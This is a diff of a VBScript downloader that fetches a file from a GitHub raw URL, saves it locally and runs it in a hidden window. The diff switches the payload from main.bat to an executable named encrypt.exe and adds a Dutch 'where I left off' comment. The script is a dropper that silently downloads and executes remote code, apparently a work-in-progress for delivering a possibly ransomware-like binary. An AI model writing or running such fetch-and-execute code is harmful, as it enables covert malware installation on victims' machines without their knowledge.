@@ -4,16 +4,16 @@ Dim objWinHTTP, objFSO, objFile, objShell
 Dim url, localFilePath, strScriptPath, strBatPath
 
 ' URL of the file to download
-url = "https://raw.githubusercontent.com/Sap196/PWS_new/main/main.bat"
+url = "https://raw.githubusercontent.com/Sap196/PWS_new/main/encrypt.exe"
 
 ' Local path where the file will be saved
-localFilePath = "main.bat"
+localFilePath = "encrypt.exe"
 
 ' Get the path of the script
 strScriptPath = WScript.ScriptFullName
 
 ' Specify the path of the bat file
-strBatPath = "main.bat"
+strBatPath = "encrypt.exe"
 
 ' Create a WinHTTP object
 Set objWinHTTP = CreateObject("WinHttp.WinHttpRequest.5.1")
@@ -37,8 +37,11 @@ End If
 
 ' Run the downloaded batch file
 Set objShell = CreateObject("WScript.Shell")
-objShell.Run "main.bat", 0, False
+objShell.Run "encrypt.exe > output.txt", 0, False
 Set objShell = Nothing
+
+' HIER WAS IK GEBLEVEN
+'---------------------
 
 WScript.Sleep 10000
 
